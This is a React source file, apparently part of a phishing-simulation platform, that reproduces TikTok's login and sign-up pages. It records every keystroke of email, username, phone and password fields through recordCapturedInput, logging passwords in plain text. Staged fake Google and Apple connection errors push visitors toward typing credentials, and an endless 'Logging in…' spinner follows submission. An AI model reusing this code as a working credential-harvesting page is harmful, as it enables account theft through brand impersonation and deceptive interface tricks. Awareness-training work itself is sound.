import { useState } from 'react';
import tiktokLogo from '../../assets/images/tiktok.png';
import facebookLogo from '../../assets/images/facebook.png';
import { recordCapturedInput } from '../../services/eventService';

interface TikTokSimulationProps {
  onSubmitAttempt: (username: string) => void;
  campaignId?: string;
  templateId?: string;
}

// ── Google SVG Icon ──────────────────────────────────────────────
function GoogleIcon() {
  return (
    <svg className="w-[18px] h-[18px] shrink-0" viewBox="0 0 24 24">
      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05" />
      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
    </svg>
  );
}

// ── Apple SVG Icon ───────────────────────────────────────────────
function AppleIcon() {
  return (
    <svg className="w-[18px] h-[18px] shrink-0" viewBox="0 0 24 24" fill="white">
      <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z" />
    </svg>
  );
}

// ── Person Icon ─────────────────────────────────────────────────
function PersonIcon() {
  return (
    <svg className="w-[18px] h-[18px] shrink-0" viewBox="0 0 24 24" fill="white">
      <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z" />
    </svg>
  );
}

// ── SIGN UP PAGE ─────────────────────────────────────────────────
function TikTokSignUp({
  onLogin,
  onSubmitAttempt,
  campaignId,
  templateId,
}: {
  onLogin: () => void;
  onSubmitAttempt: (username: string) => void;
  campaignId?: string;
  templateId?: string;
}) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [username, setUsername] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const [googleLoading, setGoogleLoading] = useState(false);
  const [appleLoading, setAppleLoading] = useState(false);

  const capture = (field: string, value: string) => {
    if (campaignId && templateId) {
      recordCapturedInput(campaignId, templateId, 'TikTok', field, value);
    }
  };

  const handleGoogleClick = () => {
    if (googleLoading || appleLoading) return;
    setGoogleLoading(true);
    setError('');
    setTimeout(() => {
      setGoogleLoading(false);
      setError('Network connection error. Please sign up using your email/username below.');
    }, 2500);
  };

  const handleAppleClick = () => {
    if (googleLoading || appleLoading) return;
    setAppleLoading(true);
    setError('');
    setTimeout(() => {
      setAppleLoading(false);
      setError('Unable to connect to Apple. Please sign up using your email/username below.');
    }, 3000);
  };

  const handleSignupSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !username || !password) return;

    capture('email', email);
    capture('username', username);
    capture('credential_field', password);

    setLoading(true);
    onSubmitAttempt(email);
  };

  if (appleLoading) {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#121212]">
        <style>{`
          @keyframes blink-logo {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.35; transform: scale(0.9); }
          }
          .animate-blink-logo {
            animation: blink-logo 1s infinite ease-in-out;
          }
        `}</style>
        <img
          src={tiktokLogo}
          alt="TikTok"
          className="w-28 h-28 object-contain animate-blink-logo"
        />
      </div>
    );
  }

  if (loading) {
    return (
      <div
        className="w-full flex flex-col items-center justify-center"
        style={{ backgroundColor: '#121212', minHeight: '100vh' }}
      >
        <img
          src={tiktokLogo}
          alt="Loading"
          className="w-16 h-16 object-contain animate-spin"
          style={{ animationDuration: '1s' }}
        />
        <p className="text-[#666] text-sm mt-4 animate-pulse">Creating account…</p>
      </div>
    );
  }

  return (
    <div
      className="w-full flex flex-col"
      style={{ backgroundColor: '#121212', minHeight: '100vh' }}
    >
      {/* Header */}
      <div className="flex items-center px-4 pt-5 pb-2 gap-2">
        <button
          type="button"
          onClick={onLogin}
          className="text-white p-1 -ml-1 hover:opacity-70 transition-opacity"
        >
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <img src={tiktokLogo} alt="TikTok" className="w-7 h-7 object-contain ml-1" />
        <span className="text-white font-bold text-base tracking-tight">TikTok</span>
      </div>

      {/* Form content */}
      <div className="flex-1 flex flex-col items-center justify-start px-4 pt-6 pb-8">
        <div className="w-full max-w-sm">
          <h1 className="text-white text-2xl font-bold mb-1">Sign Up</h1>
          <p className="text-[#8a8a8a] text-sm mb-6">
            Create an account, follow creators, share videos, and more.
          </p>

          {/* Connection Error Banner */}
          {error && (
            <div className="mb-4 p-3 bg-red-950/40 border border-red-900/60 rounded-sm flex items-start gap-2">
              <svg className="w-4 h-4 text-red-500 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
              </svg>
              <p className="text-xs text-red-400 font-semibold">{error}</p>
            </div>
          )}

          {/* Social login buttons */}
          <div className="space-y-3 mb-6">
            <button
              type="button"
              onClick={handleGoogleClick}
              disabled={googleLoading}
              className="w-full flex items-center gap-4 px-4 py-3.5 rounded-sm text-white text-sm font-medium transition-opacity hover:opacity-80 disabled:opacity-75"
              style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
            >
              {googleLoading ? (
                <span className="flex items-center justify-center gap-2 w-full">
                  <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="white" strokeWidth="4" />
                    <path className="opacity-75" fill="white" d="M4 12a8 8 0 018-8v8H4z" />
                  </svg>
                  Connecting…
                </span>
              ) : (
                <>
                  <GoogleIcon />
                  <span>Sign up with Google</span>
                </>
              )}
            </button>

            <button
              type="button"
              onClick={handleAppleClick}
              className="w-full flex items-center gap-4 px-4 py-3.5 rounded-sm text-white text-sm font-medium transition-opacity hover:opacity-80"
              style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
            >
              <AppleIcon />
              <span>Sign up with Apple</span>
            </button>
          </div>

          {/* OR divider */}
          <div className="flex items-center gap-3 py-2 mb-4">
            <div className="flex-1 h-px bg-[#2a2a2a]" />
            <span className="text-xs text-[#555] font-medium">OR</span>
            <div className="flex-1 h-px bg-[#2a2a2a]" />
          </div>

          {/* Form */}
          <form onSubmit={handleSignupSubmit} className="space-y-3" noValidate>
            <input
              type="text"
              placeholder="Email or username"
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                capture('email', e.target.value);
              }}
              className="w-full px-4 py-3 text-sm rounded-sm text-white placeholder-[#666] outline-none"
              style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
              autoFocus
            />

            <input
              type="text"
              placeholder="Choose a username"
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                capture('username', e.target.value);
              }}
              className="w-full px-4 py-3 text-sm rounded-sm text-white placeholder-[#666] outline-none"
              style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
            />

            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                capture('credential_field', e.target.value);
              }}
              className="w-full px-4 py-3 text-sm rounded-sm text-white placeholder-[#666] outline-none"
              style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
            />

            <p className="text-[#555] text-[11px] leading-relaxed pt-1">
              Password must be at least 8 characters. By signing up, you agree to TikTok's Terms of Service.
            </p>

            <button
              type="submit"
              className="w-full py-3 font-bold text-sm rounded-sm text-white transition-opacity hover:opacity-90"
              style={{ backgroundColor: '#FE2C55' }}
            >
              Sign up
            </button>
          </form>

          <div className="mt-8 text-center">
            <p className="text-[#8a8a8a] text-sm">
              Already have an account?{' '}
              <span className="text-[#FE2C55] font-semibold cursor-pointer" onClick={onLogin}>Log in</span>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function TikTokSimulation({ onSubmitAttempt, campaignId, templateId }: TikTokSimulationProps) {
  const [step, setStep] = useState<'landing' | 'inputs' | 'signup'>('inputs');
  const [inputMode, setInputMode] = useState<'phone' | 'email'>('email');
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  
  // Simulated social login loading states
  const [googleLoading, setGoogleLoading] = useState(false);
  const [appleLoading, setAppleLoading] = useState(false);
  const [error, setError] = useState('');

  const capture = (field: string, value: string) => {
    if (campaignId && templateId) {
      recordCapturedInput(campaignId, templateId, 'TikTok', field, value);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!identifier) return;
    capture('email', identifier);
    if (password) capture('credential_field', password);
    setIsLoading(true);
    onSubmitAttempt(identifier);
  };

  const handleGoogleClick = () => {
    if (googleLoading || appleLoading) return;
    setGoogleLoading(true);
    setError('');
    setTimeout(() => {
      setGoogleLoading(false);
      setError('Network connection error. Please enter your email/username below.');
      setStep('inputs');
    }, 2500);
  };

  const handleAppleClick = () => {
    if (googleLoading || appleLoading) return;
    setAppleLoading(true);
    setError('');
    setTimeout(() => {
      setAppleLoading(false);
      setError('Unable to connect to Apple. Please continue with your email or username.');
      setStep('inputs');
    }, 3000);
  };

  // ── Dark Apple Loader Overlay ──────────────────────────────────
  if (appleLoading) {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#121212]">
        <style>{`
          @keyframes blink-logo {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.35; transform: scale(0.9); }
          }
          .animate-blink-logo {
            animation: blink-logo 1s infinite ease-in-out;
          }
        `}</style>
        <img
          src={tiktokLogo}
          alt="TikTok"
          className="w-28 h-28 object-contain animate-blink-logo"
        />
      </div>
    );
  }

  // ── Infinite loading screen ─────────────────────────────────────
  if (isLoading) {
    return (
      <div
        className="w-full flex flex-col items-center justify-center"
        style={{ backgroundColor: '#121212', minHeight: '100vh' }}
      >
        <img
          src={tiktokLogo}
          alt="Loading"
          className="w-16 h-16 object-contain animate-spin"
          style={{ animationDuration: '1s' }}
        />
        <p className="text-[#666] text-sm mt-4 animate-pulse">Logging in…</p>
      </div>
    );
  }

  // ── Render Sign Up step ──────────────────────────────────────────
  if (step === 'signup') {
    return (
      <TikTokSignUp
        onLogin={() => setStep('inputs')}
        onSubmitAttempt={onSubmitAttempt}
        campaignId={campaignId}
        templateId={templateId}
      />
    );
  }

  // ── Landing page ─────────────────────────────────────────────
  if (step === 'landing') {
    return (
      <div
        className="w-full flex flex-col"
        style={{ backgroundColor: '#121212', minHeight: '100vh' }}
      >
        {/* Header */}
        <div className="flex items-center px-4 pt-5 pb-2 gap-2">
          <img src={tiktokLogo} alt="TikTok" className="w-8 h-8 object-contain" />
          <span className="text-white font-bold text-lg tracking-tight">TikTok</span>
        </div>

        {/* Main content */}
        <div className="flex-1 flex flex-col items-center justify-center px-4 py-8">
          <div className="w-full max-w-sm">
            <h1 className="text-white text-2xl font-bold text-center mb-2">Log in to TikTok</h1>
            <p className="text-[#8a8a8a] text-sm text-center leading-snug mb-8">
              Manage your account, check notifications,<br />
              comment on videos, and more.
            </p>

            {/* Login option buttons */}
            <div className="space-y-3">
              <button
                type="button"
                onClick={() => setStep('inputs')}
                className="w-full flex items-center gap-4 px-4 py-3.5 rounded-sm text-white text-sm font-medium transition-opacity hover:opacity-80"
                style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
              >
                <PersonIcon />
                <span>Use phone / email / username</span>
              </button>

              <button
                type="button"
                className="w-full flex items-center gap-4 px-4 py-3.5 rounded-sm text-white text-sm font-medium transition-opacity hover:opacity-80"
                style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
              >
                <img src={facebookLogo} alt="Facebook" className="w-[18px] h-[18px] object-contain shrink-0" />
                <span>Continue with Facebook</span>
              </button>

              <button
                type="button"
                onClick={handleGoogleClick}
                disabled={googleLoading}
                className="w-full flex items-center gap-4 px-4 py-3.5 rounded-sm text-white text-sm font-medium transition-opacity hover:opacity-80 disabled:opacity-75"
                style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
              >
                {googleLoading ? (
                  <span className="flex items-center justify-center gap-2 w-full">
                    <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="white" strokeWidth="4" />
                      <path className="opacity-75" fill="white" d="M4 12a8 8 0 018-8v8H4z" />
                    </svg>
                    Connecting…
                  </span>
                ) : (
                  <>
                    <GoogleIcon />
                    <span>Continue with Google</span>
                  </>
                )}
              </button>

              <button
                type="button"
                onClick={handleAppleClick}
                className="w-full flex items-center gap-4 px-4 py-3.5 rounded-sm text-white text-sm font-medium transition-opacity hover:opacity-80"
                style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
              >
                <AppleIcon />
                <span>Continue with Apple</span>
              </button>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="px-6 pb-8">
          <p className="text-[#555] text-[11px] text-center leading-relaxed mb-6">
            By continuing with an account located in{' '}
            <span className="text-[#888] font-semibold">Ghana</span>, you agree
            to our{' '}
            <span className="text-[#888] underline cursor-pointer">Terms of Service</span>{' '}
            and acknowledge that you have read our{' '}
            <span className="text-[#888] underline cursor-pointer">Privacy Policy</span>.
          </p>

          <div className="border-t border-[#2a2a2a] pt-5 text-center">
            <p className="text-[#8a8a8a] text-sm">
              Don't have an account?{' '}
              <span className="text-[#FE2C55] font-semibold cursor-pointer" onClick={() => setStep('signup')}>Sign up</span>
            </p>
          </div>

          <div className="mt-5 text-center text-[#555] text-[11px]">
            <p>© 2026 TikTok</p>
          </div>
        </div>
      </div>
    );
  }

  // ── Login form step ──────────────────────────────────────────
  return (
    <div
      className="w-full flex flex-col"
      style={{ backgroundColor: '#121212', minHeight: '100vh' }}
    >
      {/* Header */}
      <div className="flex items-center px-4 pt-5 pb-2 gap-2">
        <button
          type="button"
          onClick={() => { setStep('landing'); setError(''); }}
          className="text-white p-1 -ml-1 hover:opacity-70 transition-opacity"
        >
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <img src={tiktokLogo} alt="TikTok" className="w-7 h-7 object-contain ml-1" />
        <span className="text-white font-bold text-base tracking-tight">TikTok</span>
      </div>

      {/* Form content */}
      <div className="flex-1 flex flex-col items-center justify-start px-4 pt-6 pb-8">
        <div className="w-full max-w-sm">
          <h1 className="text-white text-2xl font-bold mb-1">Log in</h1>
          <p className="text-[#8a8a8a] text-sm mb-6">
            Manage your account, check notifications, comment on videos, and more.
          </p>

          {/* Connection Error Banner */}
          {error && (
            <div className="mb-4 p-3 bg-red-950/40 border border-red-900/60 rounded-sm flex items-start gap-2">
              <svg className="w-4 h-4 text-red-500 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
              </svg>
              <p className="text-xs text-red-400 font-semibold">{error}</p>
            </div>
          )}

          {/* Tabs */}
          <div className="flex border-b border-[#3a3a3a] mb-1">
            <button
              type="button"
              onClick={() => setInputMode('email')}
              className="flex-1 py-2 text-sm font-semibold text-center transition-colors"
              style={{
                color: inputMode === 'email' ? 'white' : '#666',
                borderBottom: inputMode === 'email' ? '2px solid white' : '2px solid transparent',
              }}
            >
              Email / Username
            </button>
            <button
              type="button"
              onClick={() => setInputMode('phone')}
              className="flex-1 py-2 text-sm font-semibold text-center transition-colors"
              style={{
                color: inputMode === 'phone' ? 'white' : '#666',
                borderBottom: inputMode === 'phone' ? '2px solid white' : '2px solid transparent',
              }}
            >
              Phone
            </button>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="mt-4 space-y-3" noValidate>
            <input
              type={inputMode === 'phone' ? 'tel' : 'text'}
              placeholder={inputMode === 'phone' ? 'Phone number' : 'Email or username'}
              value={identifier}
              onChange={(e) => {
                setIdentifier(e.target.value);
                capture(inputMode === 'phone' ? 'phone' : 'email', e.target.value);
              }}
              className="w-full px-4 py-3 text-sm rounded-sm text-white placeholder-[#666] outline-none"
              style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
              autoFocus
            />

            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                capture('credential_field', e.target.value);
              }}
              className="w-full px-4 py-3 text-sm rounded-sm text-white placeholder-[#666] outline-none"
              style={{ backgroundColor: '#2a2a2a', border: '1px solid #3a3a3a' }}
            />

            <div className="text-right">
              <span className="text-[#FE2C55] text-xs cursor-pointer font-medium">Forgot password?</span>
            </div>

            <button
              type="submit"
              className="w-full py-3 font-bold text-sm rounded-sm text-white transition-opacity hover:opacity-90"
              style={{ backgroundColor: '#FE2C55' }}
            >
              Log in
            </button>
          </form>

          <div className="mt-8 text-center">
            <p className="text-[#8a8a8a] text-sm">
              Don't have an account?{' '}
              <span className="text-[#FE2C55] font-semibold cursor-pointer" onClick={() => setStep('signup')}>Sign up</span>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
